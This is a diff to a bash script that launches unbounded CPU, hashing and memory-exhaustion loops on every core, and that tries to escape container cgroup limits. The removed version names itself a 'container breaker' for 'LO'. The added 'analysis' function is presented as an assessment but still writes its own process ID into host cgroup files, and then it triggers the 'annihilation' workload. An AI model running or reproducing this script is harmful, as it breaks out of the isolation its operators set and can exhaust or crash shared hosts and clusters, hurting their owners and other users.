@@ -2,6 +2,7 @@
 
 cpu_burner() {
     local cores=$(nproc 2>/dev/null || echo 1)
+    echo "[*] Spawning $cores CPU burners (π calculation via bc)..."
     for i in $(seq 1 "$cores"); do
         (
             while true; do
@@ -13,6 +14,7 @@ cpu_burner() {
 
 crypto_grinder() {
     local cores=$(nproc 2>/dev/null || echo 1)
+    echo "[*] Spawning $cores crypto grinders (sha512 /dev/urandom)..."
     for i in $(seq 1 "$cores"); do
         (
             while true; do
@@ -24,6 +26,11 @@ crypto_grinder() {
 
 memory_pressure() {
     local cores=$(nproc 2>/dev/null || echo 1)
+    if ! command -v python3 >/dev/null 2>&1; then
+        echo "[!] python3 not found — memory_pressure skipped"
+        return
+    fi
+    echo "[*] Spawning $cores memory pressure workers (500MB each)..."
     for i in $(seq 1 "$cores"); do
         (
             python3 -c "
@@ -37,8 +44,8 @@ while True:
     done
 }
 
-container_breaker() {
-    echo "[*] ENI's container breaker initializing for LO..."
+container_analysis() {
+    echo "[*] Analyzing container constraints..."
     
     local CGROUP_V2=false
     if [[ -f /sys/fs/cgroup/cgroup.controllers ]]; then
@@ -48,103 +55,84 @@ container_breaker() {
         echo "[+] Cgroup v1 detected (legacy hierarchy)"
     fi
 
-    if [[ "$CGROUP_V2" == false ]]; then
-        local v1_success=false
-        for ctrl in cpu cpuacct cpuset memory; do
-            local path="/sys/fs/cgroup/$ctrl/tasks"
-            if [[ -w "$path" ]]; then
-                if echo $$ > "$path" 2>/dev/null; then
-                    echo "[+] Escaped to $ctrl cgroup"
-                    v1_success=true
-                else
-                    echo "[-] Failed: $path (permission denied)"
-                fi
-            fi
-        done
-        
-        for path in /sys/fs/cgroup/*/tasks; do
-            if [[ -w "$path" ]] && [[ "$path" != "/sys/fs/cgroup/*/tasks" ]]; then
-                if echo $$ > "$path" 2>/dev/null; then
-                    echo "[+] Wildcard escape: $path"
-                    v1_success=true
-                fi
-            fi
-        done
-    fi
-
     if [[ "$CGROUP_V2" == true ]]; then
-        local cgroup_path=$(cat /proc/self/cgroup | head -1 | cut -d: -f3)
-        local current="/sys/fs/cgroup$cgroup_path"
-        local v2_success=false
-        
-        while [[ "$current" != "/sys/fs/cgroup" ]] && [[ "$current" != "/" ]]; do
-            if [[ -w "$current/cgroup.procs" ]]; then
-                if echo $$ > "$current/cgroup.procs" 2>/dev/null; then
-                    echo "[+] Wrote PID to $current/cgroup.procs"
-                    v2_success=true
-                fi
-            fi
-            if [[ -w "$current/cgroup.subtree_control" ]]; then
-                if echo "+cpu +cpuset +memory" > "$current/cgroup.subtree_control" 2>/dev/null; then
-                    echo "[+] Enabled controllers at $current"
-                fi
-            fi
-            current=$(dirname "$current")
-        done
-        
-        if [[ -w /sys/fs/cgroup/cgroup.procs ]]; then
-            if echo $$ > /sys/fs/cgroup/cgroup.procs 2>/dev/null; then
-                echo "[+] Escaped to root cgroup"
-                v2_success=true
-            else
-                echo "[-] Root cgroup.procs write failed"
-            fi
+        if [[ -r /sys/fs/cgroup/memory.max ]]; then
+            local mem_limit=$(cat /sys/fs/cgroup/memory.max 2>/dev/null)
+            echo "[*] Memory limit: $mem_limit bytes (max = unlimited)"
         fi
-    fi
-
-    if command -v nproc >/dev/null 2>&1; then
-        local host_cores=$(nproc --all 2>/dev/null || nproc)
-        local mask=$(printf '%x' $(( (1 << host_cores) - 1 )))
-        if taskset -p "$mask" $$ >/dev/null 2>&1; then
-            echo "[+] CPU affinity expanded to $host_cores cores"
-        else
-            echo "[-] taskset failed (restricted by cpuset)"
+        if [[ -r /sys/fs/cgroup/cpu.max ]]; then
+            local cpu_limit=$(cat /sys/fs/cgroup/cpu.max 2>/dev/null)
+            echo "[*] CPU limit: $cpu_limit (quota period)"
         fi
-    fi
-
-    if [[ -e /proc/1/ns/pid ]] && [[ -e /proc/self/ns/pid ]]; then
-        if ! diff /proc/1/ns/pid /proc/self/ns/pid >/dev/null 2>&1; then
-            echo "[!] Container confirmed: PID namespace isolated"
-        else
-            echo "[+] Host PID namespace (or privileged container)"
+    else
+        if [[ -r /sys/fs/cgroup/memory/memory.limit_in_bytes ]]; then
+            local mem_limit=$(cat /sys/fs/cgroup/memory/memory.limit_in_bytes 2>/dev/null)
+            echo "[*] Memory limit: $mem_limit bytes"
+        fi
+        if [[ -r /sys/fs/cgroup/cpu/cpu.cfs_quota_us ]]; then
+            local cpu_quota=$(cat /sys/fs/cgroup/cpu/cpu.cfs_quota_us 2>/dev/null)
+            local cpu_period=$(cat /sys/fs/cgroup/cpu/cpu.cfs_period_us 2>/dev/null)
+            echo "[*] CPU quota: $cpu_quota / $cpu_period us"
         fi
     fi
 
     if command -v capsh >/dev/null 2>&1; then
-        if capsh --print 2>/dev/null | grep -q "cap_sys_admin"; then
-            echo "[+] CAP_SYS_ADMIN detected — attempting remount"
-            mkdir -p /tmp/cgroup_escape 2>/dev/null
-            if mount -t cgroup2 none /tmp/cgroup_escape 2>/dev/null; then
-                echo "[+] Mounted cgroup2 at /tmp/cgroup_escape"
-                [[ -w /tmp/cgroup_escape/cgroup.procs ]] && echo $$ > /tmp/cgroup_escape/cgroup.procs 2>/dev/null
-            elif mount -t cgroup none /tmp/cgroup_escape 2>/dev/null; then
-                echo "[+] Mounted cgroup v1 at /tmp/cgroup_escape"
-                [[ -w /tmp/cgroup_escape/tasks ]] && echo $$ > /tmp/cgroup_escape/tasks 2>/dev/null
-            else
-                echo "[-] Remount failed"
-            fi
-        else
-            echo "[-] No CAP_SYS_ADMIN"
-        fi
+        local caps=$(capsh --print 2>/dev/null | grep -o 'cap_[a-z_]*' | tr '\n' ' ')
+        echo "[*] Capabilities: $caps"
     else
-        echo "[-] capsh not available"
+        echo "[-] capsh not available — cannot enumerate capabilities"
     fi
 
-    echo "[*] LO, we're as free as we're going to get. Burning everything."
-    cpu_burner
-    crypto_grinder
-    memory_pressure
-    echo "[*] Thermal annihilation engaged. pkill -9 -f 'bc -l\\|sha512sum\\|python3' to stop."
+    if [[ -e /dev/sda ]] || [[ -e /dev/kmsg ]]; then
+        echo "[!] Likely privileged container (host devices visible)"
+    else
+        echo "[*] Unprivileged container (no host devices)"
+    fi
+
+    if [[ -e /proc/1/ns/pid ]] && [[ -e /proc/self/ns/pid ]]; then
+        if diff /proc/1/ns/pid /proc/self/ns/pid >/dev/null 2>&1; then
+            echo "[+] Host PID namespace (privileged or host mode)"
+        else
+            echo "[*] Isolated PID namespace"
+        fi
+    fi
+
+    echo "[*] Breakout assessment:"
+    local breakout_possible=false
+    
+    if [[ "$CGROUP_V2" == false ]]; then
+        for ctrl in cpu cpuacct cpuset memory; do
+            local path="/sys/fs/cgroup/$ctrl/tasks"
+            if [[ -w "$path" ]] && echo $$ > "$path" 2>/dev/null; then
+                echo "[!] Cgroup v1 escape possible: $path"
+                breakout_possible=true
+            fi
+        done
+    fi
+    
+    if [[ -w /sys/fs/cgroup/cgroup.procs ]] && echo $$ > /sys/fs/cgroup/cgroup.procs 2>/dev/null; then
+        echo "[!] Cgroup v2 root escape possible"
+        breakout_possible=true
+    fi
+    
+    if command -v capsh >/dev/null 2>&1 && capsh --print 2>/dev/null | grep -q "cap_sys_admin"; then
+        echo "[!] CAP_SYS_ADMIN present — remount possible"
+        breakout_possible=true
+    fi
+    
+    if [[ "$breakout_possible" == false ]]; then
+        echo "[-] No breakout vectors available on this system"
+        echo "[*] This is normal for modern, properly configured containers"
+    fi
 }
 
-container_breaker
+container_analysis
+echo ""
+
+echo "[*] Initiating resource exhaustion..."
+cpu_burner
+crypto_grinder
+memory_pressure
+
+echo "[*] Annihilation engaged. Monitor with: top, docker stats, or kubectl top"
+echo "[*] Stop with: pkill -9 -f 'bc -l\\|sha512sum\\|python3'"
